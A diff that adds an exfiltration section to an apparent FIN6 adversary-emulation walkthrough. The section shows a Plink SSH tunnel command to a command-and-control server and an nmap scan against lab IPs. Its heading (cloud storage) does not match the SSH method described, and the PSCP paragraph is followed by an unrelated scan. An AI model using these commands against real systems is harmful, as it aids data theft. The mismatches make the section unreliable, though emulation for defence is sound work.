@@ -425,6 +425,23 @@ PS > .\7.exe a -mx3 ad.7z ad_*
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-4_1_7zip_Acrhive_Collection.png){:width="100%"}
 
+### 4.2 - Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002) 
+FIN6 exfiltrates the text files resultant from the Discovery Phase via SSH. FIN6 leveraged the publicly available Plink command-line utility
+(part of the PuTTY SSH and Telnet suite) to create SSH tunnels to CnC servers under their control. 
+
+```bash
+plink -ssh #{user}@#{server}
+Example: C:\>plink -ssh root@192.168.101.1
+```
+
+Alternatively, we can another PuTTY SSH module called PSCP. PSCP (PuTTY Secure Copy Protocol) is a command-line tool for transferring files and folders from a Windows computer to a Linux computer.
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -sV 192.168.111.165
+```
+
+
 FIN6
 FIN6
 
